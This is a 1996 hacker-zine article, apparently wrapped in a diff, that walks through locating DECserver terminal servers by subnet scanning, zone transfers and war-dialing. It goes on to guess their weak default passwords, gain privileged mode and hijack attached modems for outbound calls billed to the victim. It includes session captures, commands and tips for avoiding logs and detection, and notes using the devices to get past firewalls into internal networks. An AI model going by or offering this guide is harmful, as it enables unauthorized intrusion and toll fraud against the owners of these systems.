@@ -1,0 +1,257 @@
+   Global OutDials on DECservers                  - Italy -   May 1996
+   by Zhart/THC
+
+                   
+þ Finding a DECserver
+
+ The DECserver is a terminal server, it connects its terminals to
+ hosts available on an Ethernet Local Area Network.
+ DecServers are usually reachable via telnet and sometimes via dialup.
+ Via telnet you need to scan/search for them in the internet,
+ Via dialups use a good Carrier Scanner like ToneLoc or THC-Scan.
+
+Telnet:
+ About telnet connection decservers have normal ip addresses,
+ but what we are interested in is the alpha address, 'cause almost always
+ it starts with "DS"; just something like:
+      DS7001.fuck.you.asshole
+ and if the owners are very very lame it can even contain the
+ string "MODEM" or "DIAL" (wow!) in its alpha address.
+ So what I suggest is to combine a brute force scanning with an intelligent
+ (smart) behaviour...
+ You should first find a route ip address of a university or of a science
+ research network or whatelse you (and, after some scanning, your experience)
+ think could have such a beautiful device.
+ It should be a network big enough to have several vaxes and other machines...
+ Note that not always an alpha address starting with "DS"
+ leads to a DECserver , i.e. sometimes ultrix machines have an address
+ like that.
+[I personally made a script to scan subnets from XXX.XXX.0.0 to
+ XXX.XXX.255.255 or from XXX.XXX.XXX.0 to XXX.XXX.XXX.255
+ and to save only interesting alpha addresses,
+ but i don't suggest to use it automatically, in other words
+ take it always under control and use your brain!]
+
+ þ Warning: usually scripts like this do a lot of noise;
+            think about "lastcomm" "ps" and things like that ...
+ þ Warning: to do subnet scanning you need an host with a very fast connection
+ þ Warning: CERT SUX !!!!!!   ;)
+
+ NOTE: 
+ instead of a script it's wiser to do a zone transfer (for example with
+ nslookup or dig) to get all the alpha names in a domain. But this needs
+ a) an skilled unix user and b) the target DNS server must allow zone
+ transfers. (There are other methods but this article isn't about unix
+ hacking ;-) So I only present this better possiblity which not many can
+ do reading this article.
+
+
+Dialup:
+ Nothing much to say about scanning these ... just do a fast carrier scan
+ of an area overnight and hope you get a dec-server. If you know that a
+ company has got dialups and a big computer network, then try to scan
+ those local numbers. There aren't much on toll free numbers and those
+ are usually more protected.
+
+ If you connect via dialup, you have no problem to recognize it:
+_______________________________________________________________________________
+
+DECserver 700-08 Communications Server V1.1 (BL44G-11A) - LAT V5.1
+DPS502-DS700
+
+(c) Copyright 1992, Digital Equipment Corporation - All Rights Reserved
+
+Please type HELP if you need assistance
+
+Enter username> THC
+
+Local>
+
+------------------------------------------------[FROM alt.2600/#hack.FAQ]------
+
+
+ But if you connect via telnet it will not appear anything on your screen:
+
+-------------------------[Start Capture]---------------------------------------
+
+telnet> open ds7001.fuck.you.asshole
+Trying 123.45.678.910 ...
+Connected to ds7001.fuck.you.asshole
+Escape character is '^]'.
+
+---------------------------[End Capture]--------------------------------------
+
+
+ All you have to do is just press enter (it's easy uh?), and it will
+ appear a "#" prompt (at this time you are quite sure it's a DECserver),
+ echo gets off and ...
+ now comes the time to type the password to enter the DEC ...
+ I won't tell you the default pwd (which in 99% of my times was the good one)
+ 'cause .... 'cause shit ! Do I have to tell you everything??? (scan!)
+ It's a very very lame password usually one of the firsts that you could think
+ of. You have 3 tries, after that it disconnects you. I don't know if there are
+ warnings or logs of wrong attempts made, but can tell that IF the password is
+ not the default one, then the system administrators take care about security
+ very very much, so be careful.
+ Typing the right password appears the same screen of the first capture
+ (look up!), you are asked a username but it isn't of any importance, just
+ type something unsuspicious like just one letter.
+
+
+þ Once in ... let's find out if there's a modem !
+
+ The "Local> " prompt is the DECserver prompt , I strongly suggest to give a
+ "help" command 'cause the dec help is very kind and it will tell you
+ more interesting things you can imagine... and you should learn from practice,
+ not reading shitty articles like this one from zines <g> !
+ Ok, to have an idea of where you are , there are two commands :
+ "show users"
+ "show services"
+ The second one will tell you all the possible connections:
+
+
+---------------------[Start Capture]-------------------------------------------
+Local> show services
+
+Service Name        Status       Identification
+AXPXXS              Available    DEC OSF/1 Version V3.2 LAT SERVICE
+AXPXX1              Available    @sys$manager:XXXXXXXX_axp.txt
+AXPXX2              Unknown      DEC OSF/1 Version V3.0 LAT SERVICE
+AXPXX3              Available     ALPHA 3000/400 - XXXXXX IV - XXX
+AXPXX5              Available     ALPHA 3000/400 - XXXXXX II - XXX
+AXPXX6              Available     ALPHA 3000/300 - XXXXXX IV/XXXXX - XXX
+AXPXX7              Available     ALPHA 3000/300 - C.S. - XXX
+AXPXX8              Available     DEC 200 4/166 - XXXXXX III - XXX
+AXPXX9              Available     DEC 200 4/166 - VETOR_1 - XXX
+AXPXXA              Available     DEC 200 4/166 - VETOR_2 - XXX
+AXPXXB              Available           DEC 400 4/233 -  G. XXXXXX
+AXPXXC              Unknown       DEC 200 4/166 - AXX - XXX
+AXPXXD              Available     DEC 200 4/166 - AXX - XXX
+XXXXXXX             Available    ULTRIX 4.3 (RISC)
+XXXXXXXX            Available           MV3100-M76   XXXX-XXX   XXXX2
+XXXXXX              Available           VS3100-M76 - C. XXXXXXX
+XXXXXX              Available    XXXXserver 310 XXXXXXXXXXXXXXXXX
+MVCB0               Unknown             VS 2100 - XXXXX
+MVCBCT              Available           XXXX cluster - VAX/VMS V5.5
+MXXXX2              Available           VS3100 - XXX Server Decnet-XXX
+MXXXX7              Available           MV3100-M76 - XXXXXXXXXXXXXXXXX
+MVXXX8              Available           Welcome to VAX/VMS V5.5-2
+MVXXX4              Available           VS3100-M76 - Disk server-
+MX31CS              Available           Welcome to VAX/VMS V5.5-2
+SATCS3              Available           MV3100-M76 - X.X.
+XXXXXE              Unknown      DEC OSF/1 Version V3.0 LAT SERVICE
+VAXXXX              Available    @SYS$MANAGER:XXXXXXX.TXT
+VS31C1              Unknown             Welcome to VAX/VMS V5.5-2
+VS40C6              Available           Welcome to VAX/VMS V5.5-2
+VSXX12              Unknown             VS3100 - X. XXXXXX
+VSXX11              Available           VS2000 - S. XXXXXXXXXXXX
+VXXX12              Available           VS 2000/50 - XXXXXXS
+VX31CS              Available           Welcome to VAX/VMS V5.5-2
+----------------------------------[End Capture]-------------------------------
+
+
+ Reading the description or the service name it's easy to find out a modem.
+ If you find it, let's say its name is "DS1MODEM" , you just have to use
+ the "connect" command:
+
+-------------------------[Start Capture]---------------------------------------
+
+Local> connect DS1MODEM
+Local -010- Session 1 to DS1MODEM on node DS7001 established
+atz
+OK
+atdt004969823282
+CONNECT 14400/REL
+Press [ENTER] to access L.o.r.E. BBS
+
+-------------------------[End Capture]-----------------------------------------
+
+
+þ ... A little bit difficult
+
+ If from the "show services" doesn't seem to be any modem (try also strange
+ services and services without description) don't lose any hope 'cause often
+ devices such as modems are used only by sys-administrators, they create the
+ service when they need it and then "CLEAR" it.
+ What you have to do is look all the PORTS of the DECserver for modems ...
+ Here you use the "SHOW PORT" command:
+
+--------------------------[Start Capture]--------------------------------------
+
+Local> show port 8
+
+Port  8:                               Server: DSLE8
+Character Size:            8           Input Speed:               9600
+Flow Control:            XON           Output Speed:              9600
+Parity:                 None           Signal Control:        Disabled
+Stop Bits:           Dynamic           Signal Select:  CTS-DSR-RTS-DTR
+Access:                Local           Local Switch:              None
+Backwards Switch:       None           Name:                    PORT_8
+Break:                 Local           Session Limit:                4
+Forwards Switch:        None           Type:                      Ansi
+Default Protocol:        LAT
+Preferred Service: VAXXX
+Authorized Groups:   0
+(Current)  Groups:   0
+Enabled Characteristics:
+Autobaud,  Autoprompt,  Broadcast,  Input Flow Control,  Lock,
+Loss Notification,  Message Codes,  Output Flow Control,  Verification
+
+
+-------------------------------[End Capture]-----------------------------------
+
+ All of these informations are interesting but the one which usually tells
+ if a modem is connected to the port is:
+
+Enabled Characteristics:
+Dialup, etc..., etc..., etc,...
+
+ So give a look at all ports, if there's nothing interesting throw that DEC
+ in the trash ,otherwise you NEED PRIVELEGES to use the modem ...
+ In 50% of cases the password to become privileged user is the default one,
+ in 85% of cases it's a lame one ...
+ Once again I won't tell you the privileged user default password (which is
+ different from the first password) but once again I say it's an absolutely
+ lame pwd!
+ To become Privileged user do:
+
+Local> set priv
+Password>
+
+ Once again have 3 tries ,but this time I'm sure that an invalid attempt
+ is logged with a certain warning value!
+ If after you've typed the pwd it answers with the "Local>" prompt it
+ means you're a privileged user , and finally you can do :
+
+Local> set port 1 service FUCKYOU
+Local> connect FUCKYOU
+
+ And enjoy your dialout ;)
+
+
+þ Epilogue
+
+ There's a lot to learn about DECservers, about all the settings and options
+ you can switch, so experiment ... they are useful to penetrate systems
+ and can tell you very much about a network ... lot of DECs have also
+ an active telnet command ...
+
+ And you can often find valid telnet targets with the command "show domain".
+ So these DECservers can also be useful to pass a Firewall (!) and to enter
+ internal networks which would normally not available (not connected to
+ the internet) !  But this once again goes to far into unix hacking ...
+
+ But be careful do not abuse too much, use your brain ...
+ Think that sooner or later a phone bill arrives to someone and ....
+ Use modem outdials only in hours when you know offices and machines' rooms
+ are closed ...
+
+Greets and Have Fun!
+ANARCHY ALL OVER THE WORLD !!!!!!!!
+To All Italian H/P scene doods: We need to be united !
+                                Leave me a message on
+                                LorE BBS +49-69-823282
+                                Login: THC  Pwd: THC
+
+ Zhart/THC
+
